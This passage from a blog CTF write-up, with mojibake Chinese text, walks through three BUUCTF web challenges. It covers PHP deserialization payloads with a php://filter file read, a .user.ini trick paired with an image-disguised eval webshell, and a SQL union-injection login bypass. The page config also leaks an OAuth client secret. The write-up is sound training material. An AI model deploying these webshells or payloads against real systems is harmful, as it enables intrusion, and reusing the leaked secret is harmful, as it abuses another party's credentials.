</span></span><span class="line"><span class="cl">	<span class="k">class</span> <span class="nc">FileHandler</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">protected</span> <span class="nv">$op</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">protected</span> <span class="nv">$filename</span> <span class="o">=</span> <span class="s2">&#34;flag.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">protected</span> <span class="nv">$content</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FileHandler</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$b</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$b</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;s&#34;</span><span class="p">,</span> <span class="s2">&#34;S&#34;</span><span class="p">,</span> <span class="nv">$b</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl">    <span class="nv">$b</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;%00&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">00&#34;</span><span class="p">,</span> <span class="nv">$b</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl">	<span class="k">echo</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><a href="https://sandbox.onlinephpfunctions.com/" target="_blank" rel="noopener noreferrer">æ‰§è¡Œ</a>ç»“æœ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\00%2A\00op%22%3Bi%3A2%3BS%3A11%3A%22\00%2A\00filename%22%3BS%3A8%3A%22flag.php%22%3BS%3A10%3A%22\00%2A\00content%22%3BS%3A0%3A%22%22%3B%7D
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¯·æ±‚<code>?str=O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\00%2A\00op%22%3Bi%3A2%3BS%3A11%3A%22\00%2A\00filename%22%3BS%3A8%3A%22flag.php%22%3BS%3A10%3A%22\00%2A\00content%22%3BS%3A0%3A%22%22%3B%7D</code>å³å¯è·å–flagã€‚</p>
<p><figure><a class="lightgallery" href="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142159687.png" title="image-20210824142159687" data-thumbnail="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142159687.png" data-sub-html="<h2>flag</h2><p>image-20210824142159687</p>">
        <img
            
            loading="lazy"
            src="image-20210824142159687.png"
            srcset="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142159687.png, image-20210824142159687.png 1.5x, /2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142159687.png 2x"
            sizes="auto"
            alt="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142159687.png">
    </a><figcaption class="image-caption">flag</figcaption>
    </figure></p>
<h3 id="payload2" class="headerLink">
    <a href="#payload2" class="header-mark"></a>payload2</h3><p>è¿˜å¯ä»¥åˆ©ç”¨phpçš„<a href="https://www.php.net/manual/en/wrappers.php" target="_blank" rel="noopener noreferrer">ä¼ªåè®®</a>æ¥è·å–<code>flag.php</code>æ–‡ä»¶çš„base64ç¼–ç ï¼Œç„¶åå†è§£ç ï¼Œä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚</p>
<p>payloadä¸º</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\00%2A\00op%22%3Bi%3A2%3BS%3A11%3A%22\00%2A\00filename%22%3BS%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3BS%3A10%3A%22\00%2A\00content%22%3BS%3A0%3A%22%22%3B%7D
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142639616.png" title="image-20210824142639616" data-thumbnail="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142639616.png" data-sub-html="<h2>payload2</h2><p>image-20210824142639616</p>">
        <img
            
            loading="lazy"
            src="image-20210824142639616.png"
            srcset="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142639616.png, image-20210824142639616.png 1.5x, /2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142639616.png 2x"
            sizes="auto"
            alt="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142639616.png">
    </a><figcaption class="image-caption">payload2</figcaption>
    </figure></p>
<h3 id="payload3" class="headerLink">
    <a href="#payload3" class="header-mark"></a>payload3</h3><p>å…¶å®ï¼Œç½‘ç«™ä¿¡æ¯ä¸­æ˜¾ç¤ºå…¶ä½¿ç”¨çš„phpç‰ˆæœ¬ä¸º7.4.3ï¼Œè€Œ7.1+ç‰ˆæœ¬çš„phpåœ¨åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ—¶å¯¹äº<code>private</code>/<code>protected</code>æ˜¯ä¸æ•æ„Ÿçš„ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æŠŠä¸Šè¿°çš„æˆå‘˜å˜é‡éƒ½å½“ä½œ<code>public</code>ã€‚</p>
<p><figure><a class="lightgallery" href="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142739850.png" title="image-20210824142739850" data-thumbnail="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142739850.png" data-sub-html="<h2>wappalyzerç»“æœ</h2><p>image-20210824142739850</p>">
        <img
            
            loading="lazy"
            src="image-20210824142739850.png"
            srcset="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142739850.png, image-20210824142739850.png 1.5x, /2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142739850.png 2x"
            sizes="auto"
            alt="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142739850.png">
    </a><figcaption class="image-caption">wappalyzerç»“æœ</figcaption>
    </figure></p>
<p>äºæ˜¯å¯ä»¥è¿™æ ·ç”Ÿæˆpayload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">	class FileHandler {
</span></span><span class="line"><span class="cl">		public $op = 2;
</span></span><span class="line"><span class="cl">		public $filename = &#34;php://filter/read=convert.base64-encode/resource=flag.php&#34;;
</span></span><span class="line"><span class="cl">		public $content = &#34;&#34;;
</span></span><span class="line"><span class="cl">	}
</span></span><span class="line"><span class="cl">	$a = new FileHandler();
</span></span><span class="line"><span class="cl">	echo(serialize($a));
</span></span><span class="line"><span class="cl">?&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">O:11:&#34;FileHandler&#34;:3:{s:2:&#34;op&#34;;i:2;s:8:&#34;filename&#34;;s:57:&#34;php://filter/read=convert.base64-encode/resource=flag.php&#34;;s:7:&#34;content&#34;;s:0:&#34;&#34;;}
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142956654.png" title="image-20210824142956654" data-thumbnail="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142956654.png" data-sub-html="<h2>ç›´æ¥å½“ä½œpublic</h2><p>image-20210824142956654</p>">
        <img
            
            loading="lazy"
            src="image-20210824142956654.png"
            srcset="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142956654.png, image-20210824142956654.png 1.5x, /2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142956654.png 2x"
            sizes="auto"
            alt="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824142956654.png">
    </a><figcaption class="image-caption">ç›´æ¥å½“ä½œpublic</figcaption>
    </figure></p>
<p>åŒæ ·å¯ä»¥æ‹¿åˆ°flagã€‚</p>
<h3 id="æ€»ç»“" class="headerLink">
    <a href="#%e6%80%bb%e7%bb%93" class="header-mark"></a>æ€»ç»“</h3><p>è¿™é¢˜çš„æ„ä¹‰åœ¨äº<strong>phpçš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</strong>ã€<strong>åºåˆ—åŒ–ç»“æœå­—æ®µçš„å«ä¹‰</strong>ã€<strong>php7.1ç‰ˆæœ¬å¯¹äºåºåˆ—åŒ–ååºåˆ—åŒ–æ“ä½œçš„å˜åŒ–</strong></p>
<h3 id="å‚è€ƒé“¾æ¥-4" class="headerLink">
    <a href="#%e5%8f%82%e8%80%83%e9%93%be%e6%8e%a5-4" class="header-mark"></a>å‚è€ƒé“¾æ¥</h3><ul>
<li><a href="https://www.neatstudio.com/show-161-1.shtml" target="_blank" rel="noopener noreferrer">PHP åºåˆ—åŒ–ï¼ˆserializeï¼‰æ ¼å¼è¯¦è§£</a></li>
</ul>
<h2 id="0x06-suctf-2019checkin" class="headerLink">
    <a href="#0x06-suctf-2019checkin" class="header-mark"></a>0x06 [SUCTF 2019]CheckIn</h2><p><a href="https://buuoj.cn/challenges#[SUCTF%202019]CheckIn" target="_blank" rel="noopener noreferrer">é¢˜ç›®é“¾æ¥</a></p>
<p>æ–‡ä»¶ä¸Šä¼ é¢˜</p>
<p>ç½‘ç«™æŠŠphpæ–‡ä»¶çš„<a href="https://www.guru99.com/what-is-php-first-php-program.html#6" target="_blank" rel="noopener noreferrer">å¸¸ç”¨åç¼€å</a>éƒ½è¿‡æ»¤äº†ï¼Œå¹¶ä¸”æŠŠæ–‡ä»¶ä¸­çš„<code>&lt;?</code>å†…å®¹ä¹Ÿç»™è¿‡æ»¤äº†ã€‚è€ƒè™‘ç”¨<code>&lt;script language='php'&gt;@eval($_POST[&quot;password&quot;]);&lt;/script&gt;</code>çš„å†™æ³•æ¥ç»•è¿‡ã€‚</p>
<p>è¦çŸ¥é“ï¼Œæƒ³åˆ©ç”¨webshellçš„è¯ï¼Œå¿…é¡»è¦èƒ½å¤Ÿè®©æœåŠ¡ç«¯å°†ä½ ä¸Šä¼ çš„æ–‡ä»¶å½“ä½œphpæ–‡ä»¶å»è§£æï¼Œè€Œè¿™é¢˜è¿‡æ»¤äº†phpæ–‡ä»¶çš„åç¼€åï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•ä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶ï¼Œè€Œåªèƒ½ä¸Šä¼ ä¸€ä¸ªå«æœ‰phpğŸçš„å›¾ç‰‡æ–‡ä»¶ã€‚</p>
<p>æ‰€ä»¥ç¬¬äºŒä¸ªé—®é¢˜å°±æ˜¯æ€ä¹ˆè®©æœåŠ¡ç«¯å°†æˆ‘ä»¬ä¸Šä¼ çš„å›¾ç‰‡æ–‡ä»¶ä½œä¸ºphpæ–‡ä»¶å»è§£æã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨apacheçš„<code>.htaccess</code>æ–‡ä»¶è®¾ç½®è®©æœåŠ¡ç«¯å°†æŸä¸ªæ–‡ä»¶å½“ä½œphpæ–‡ä»¶è§£æã€‚ä½†æ˜¯è¿™é¢˜ç¯å¢ƒæ˜¯nginxï¼Œæ‰€ä»¥æ²¡æœ‰<code>.htaccess</code>ã€‚å†æŸ¥é˜…èµ„æ–™å¯çŸ¥ï¼Œ<code>.user.ini</code>ä¹Ÿæ˜¯ä¸€ä¸ªå¯ä»¥æ§åˆ¶phpè®¾ç½®çš„ä¸€ä¸ªç‰¹æ®Šæ–‡ä»¶ã€‚æ‰€ä»¥è¿™é¢˜çš„æ€è·¯æ˜¯å…ˆä¸Šä¼ <code>.user.ini</code>æ–‡ä»¶ï¼Œè®¾ç½®åœ¨phpæ–‡ä»¶ä¸­åŠ è½½æ¥ä¸‹æ¥è¦ä¸Šä¼ çš„å›¾ç‰‡æ–‡ä»¶ï¼Œç„¶åä¸Šä¼ å«æœ‰phpğŸçš„å›¾ç‰‡æ–‡ä»¶ã€‚</p>
<p>ä¸¤ä¸ªæ–‡ä»¶å†…å®¹</p>
<p><code>.user.ini</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GIF89a
</span></span><span class="line"><span class="cl">auto_prepend_file=zyleo.jpg
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>zyleo.jpg</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">GIF89a</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">language</span><span class="o">=</span><span class="s1">&#39;php&#39;</span><span class="o">&gt;@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;zyleo&#34;</span><span class="p">]);</span><span class="o">&lt;/</span><span class="nx">script</span><span class="o">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸Šä¼ ä¹‹åï¼Œçœ‹åˆ°ä¸Šä¼ ç›®å½•ä¸º<code>uploads/fb....b2</code>ï¼Œå…¶ä¸­ä¹Ÿæœ‰<code>index.php</code>ï¼Œè¿™å°±æ˜¯è¿æ¥webshellçš„åœ°å€</p>
<p><figure><a class="lightgallery" href="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824165341337.png" title="image-20210824165341337" data-thumbnail="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824165341337.png" data-sub-html="<h2>upload</h2><p>image-20210824165341337</p>">
        <img
            
            loading="lazy"
            src="image-20210824165341337.png"
            srcset="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824165341337.png, image-20210824165341337.png 1.5x, /2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824165341337.png 2x"
            sizes="auto"
            alt="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824165341337.png">
    </a><figcaption class="image-caption">upload</figcaption>
    </figure></p>
<p>ç„¶åèšå‰‘è¿æ¥å°±è¡Œäº†</p>
<p><code>urlåœ°å€</code>ï¼š<code>http://8d42f662-e446-4b96-afd8-ab3d2694bfa1.node4.buuoj.cn:81/uploads/fb10500f3a8407c9ec6ac288f25439b2/index.php</code></p>
<p><code>è¿æ¥å¯†ç </code>ï¼š<code>zyleo</code></p>
<p><figure><a class="lightgallery" href="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824165409582.png" title="image-20210824165409582" data-thumbnail="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824165409582.png" data-sub-html="<h2>Antsword</h2><p>image-20210824165409582</p>">
        <img
            
            loading="lazy"
            src="image-20210824165409582.png"
            srcset="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824165409582.png, image-20210824165409582.png 1.5x, /2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824165409582.png 2x"
            sizes="auto"
            alt="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824165409582.png">
    </a><figcaption class="image-caption">Antsword</figcaption>
    </figure></p>
<h3 id="å‚è€ƒè¿æ¥" class="headerLink">
    <a href="#%e5%8f%82%e8%80%83%e8%bf%9e%e6%8e%a5" class="header-mark"></a>å‚è€ƒè¿æ¥ï¼š</h3><ul>
<li><a href="https://blog.csdn.net/qq_36512966/article/details/72716079?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control" target="_blank" rel="noopener noreferrer">htaccessæ–‡ä»¶ä¸Šä¼ æ‹¿shell</a></li>
<li><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener noreferrer">user.iniæ–‡ä»¶æ„æˆçš„PHPåé—¨</a></li>
</ul>
<h2 id="0x07-gxyctf2019babysqli" class="headerLink">
    <a href="#0x07-gxyctf2019babysqli" class="header-mark"></a>0x07 [GXYCTF2019]BabySQli</h2><p><a href="https://buuoj.cn/challenges#[GXYCTF2019]BabySQli" target="_blank" rel="noopener noreferrer">é¢˜ç›®é“¾æ¥</a></p>
<p>è¿™é¢˜ä¸¤ä¸ªè¾“å…¥æ¡†ï¼Œè¯•ä¸€ä¸‹å°±å¯ä»¥å‘ç°ï¼Œæ³¨å…¥ç‚¹æ˜¯<code>UserName</code>ã€‚</p>
<p><a class="lightgallery" href="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824184531150.png" title="image-20210824184531150" data-thumbnail="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824184531150.png">
        <img
            
            loading="lazy"
            src="image-20210824184531150.png"
            srcset="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824184531150.png, image-20210824184531150.png 1.5x, /2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824184531150.png 2x"
            sizes="auto"
            alt="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210824184531150.png">
    </a></p>
<p><code>UserName</code>è¯•äº†ä¸€ä¸‹<code>a' or 1=1#</code>ï¼Œé¡µé¢è¿”å›<code>Do not hack me</code>ï¼Œè¯´æ˜è¢«è¿‡æ»¤äº†ã€‚</p>
<p>å†è¯•<code>a' union select 1,2#</code>ï¼Œè¿”å›<code>Error: The used SELECT statements have a different number of columns</code>ã€‚è¯´æ˜sqlè¯­å¥çš„æŸ¥è¯¢ç»“æœä¸æ­¢2åˆ—ï¼Œå¯ä»¥å°è¯•å‡ºæ¥æ˜¯3åˆ—ã€‚</p>
<p>åŒæ—¶ï¼Œç”¨æˆ·åè¾“<code>admin</code>ï¼Œè¿”å›çš„æ˜¯<code>wrong pass</code>ï¼Œç”¨æˆ·åè¾“å…¶ä»–çš„è¿”å›çš„æ˜¯<code>wrong user</code>ï¼Œè¯´æ˜è¿™é¢˜è¦æ»¡è¶³çš„æ¡ä»¶æ˜¯ç”¨æˆ·å<code>UserName</code>ä¸º<code>admin</code>ã€‚åŒæ—¶<code>a' union select 1,'admin',3#</code>æŠ¥çš„æ˜¯<code>wrong pass</code>ï¼Œè¯´æ˜usernameåœ¨æŸ¥è¯¢ç»“æœçš„ç¬¬äºŒåˆ—ã€‚</p>
<p>æŸ¥çœ‹ç½‘é¡µæºç ï¼Œå‘ç°æœ‰<code>search.php</code>çš„æç¤ºä¿¡æ¯ï¼ŒæŸ¥çœ‹<code>search.php</code>ï¼Œå¯ä»¥çœ‹åˆ°</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;Content-Type&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;text/html; charset=utf-8&#34;</span> <span class="p">/&gt;</span> 
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Do you know who am I?<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">wrong user!
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸Šé¢çš„æ˜¯base32ç¼–ç ï¼Œè§£ç å¾—åˆ°<code>c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==</code>ï¼Œå†ç»è¿‡base64è§£ç å¾—åˆ°è¯¥ç½‘ç«™çš„sqlæŸ¥è¯¢è¯­å¥<code>select * from user where username = '$name'</code>ã€‚</p>
<p>æŸ¥è¯¢è¯­å¥é‡Œæ²¡æœ‰å¯†ç å­—æ®µï¼Œæ‰€ä»¥å¯ä»¥æ¨æµ‹ï¼Œå¯†ç å­—æ®µåº”è¯¥æ˜¯åœ¨åç«¯è¢«æ‹¿æ¥å¯¹æ¯”äº†ã€‚åŒæ—¶å†çŒœæµ‹ï¼ˆğŸ˜‚å¥½å§å…¶å®æ˜¯æŸ¥é˜…åšå®¢ï¼Œä½†æ˜¯è¿™äº›åšå®¢ä¹Ÿæ²¡å“ªä¸ªè®²æ¸…é™¤äº†ï¼‰æ˜¯å°†æˆ‘ä»¬çš„è¾“å…¥çš„å€¼çš„md5ä¸å¯†ç çš„md5ç»“æœç›¸å¯¹æ¯”ã€‚</p>
<p>çŒœåˆ°è¿™é‡Œå°±å¯ä»¥åšäº†ã€‚ä½¿ç”¨<code>union</code>è”åˆæŸ¥è¯¢æ„é€ æŸ¥è¯¢ç»“æœï¼Œå°±å¯ä»¥è‡ªå·±æ§åˆ¶md5å†…å®¹ï¼Œç„¶åå†è¾“å…¥å¯¹åº”çš„å¯†ç å†…å®¹å³å¯ã€‚</p>
<p>payloadï¼š</p>
<p><code>a' union select 1, 'admin', '900150983cd24fb0d6963f7d28e17f72'#</code></p>
<p><code>abc</code></p>
<blockquote>
<p>flag{35de0117-ce39-40bd-8de4-40535e1a5274}</p>
</blockquote>
</div>

        <div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>æ›´æ–°äº 2021-08-24</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"><span><a class="link-to-mardown" href=/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/index.md target="_blank" rel="noopener noreferrer">é˜…è¯»åŸå§‹æ–‡æ¡£</a>
                    </span></div>
            <div class="post-info-share">
                <span><a href="#" title="åˆ†äº«åˆ° Twitter" data-sharer="twitter" data-url="https://liuliuliuzy.github.io/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/" data-title="BUUCTF webè®°å½• 3" data-hashtags="CTF,web"><i class="fab fa-twitter fa-fw"></i></a><a href="#" title="åˆ†äº«åˆ° Reddit" data-sharer="reddit" data-url="https://liuliuliuzy.github.io/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/"><i class="fab fa-reddit fa-fw"></i></a><a href="#" title="åˆ†äº«åˆ° å¾®åš" data-sharer="weibo" data-url="https://liuliuliuzy.github.io/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/" data-title="BUUCTF webè®°å½• 3"><i class="fab fa-weibo fa-fw"></i></a><a href="#" title="åˆ†äº«åˆ° ç™¾åº¦" data-sharer="baidu" data-url="https://liuliuliuzy.github.io/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/" data-title="BUUCTF webè®°å½• 3"><i data-svg-src="/lib/simple-icons/icons/baidu.min.svg"></i></a><a href="#" title="åˆ†äº«åˆ° Evernote" data-sharer="evernote" data-url="https://liuliuliuzy.github.io/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/" data-title="BUUCTF webè®°å½• 3"><i class="fab fa-evernote fa-fw"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/web/">web</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">è¿”å›</a></span>&nbsp;|&nbsp;<span><a href="/">ä¸»é¡µ</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/2021-06-29-%E5%BF%AB%E4%B9%90%E6%9C%AC%E5%B0%B1%E4%B8%8D%E8%AF%A5%E5%BB%89%E4%BB%B7/" class="prev" rel="prev" title="å¿«ä¹æœ¬å°±ä¸è¯¥å»‰ä»·"><i class="fas fa-angle-left fa-fw"></i>å¿«ä¹æœ¬å°±ä¸è¯¥å»‰ä»·</a>
            <a href="/2021-08-05-github-actions-%E8%AE%BE%E7%BD%AE%E8%AE%B0%E5%BD%95/" class="next" rel="next" title="Github Actions è®¾ç½®è®°å½•">Github Actions è®¾ç½®è®°å½•<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
<div id="comments"><div id="gitalk" class="comment"></div><noscript>
                Please enable JavaScript to view the comments powered by <a href="https://github.com/gitalk/gitalk"></a>Gitalk</a>.
            </noscript></div></article></div>
        </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">
                    ç”± <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.110.0">Hugo</a> å¼ºåŠ›é©±åŠ¨&nbsp;|&nbsp;ä¸»é¢˜ - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.3.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/liuliuliuzy" target="_blank" rel="noopener noreferrer">zyleo</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
            <div class="footer-line"></div>
            <div class="footer-line">
            </div>
        </div></footer></div>

    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="å›åˆ°é¡¶éƒ¨">
            <i class="fas fa-arrow-up fa-fw"></i>
        </a><a href="#" id="view-comments" class="fixed-button" title="æŸ¥çœ‹è¯„è®º">
            <i class="fas fa-comment fa-fw"></i>
        </a>
    </div><div id="cookieconsent-container"></div><div class="assets"><link rel="stylesheet" href="/lib/gitalk/gitalk.min.css"><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/katex/copy-tex.min.css">
        <noscript><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript">window.config={"code":{"copyTitle":"å¤åˆ¶åˆ°å‰ªè´´æ¿","maxShownLines":100},"comment":{"gitalk":{"admin":["liuliuliuzy"],"clientID":"4a1564ddad93869775af","clientSecret":"d3efcc5e0302a361dfde42c845bab546f556b0fc","id":"2021-07-19T17:02:23+08:00","owner":"liuliuliuzy","repo":"my_gittalk_comments","title":"BUUCTF webè®°å½• 3"}},"cookieconsent":{"content":{"dismiss":"åŒæ„","link":"äº†è§£æ›´å¤š","message":"æœ¬ç½‘ç«™ä½¿ç”¨ Cookies 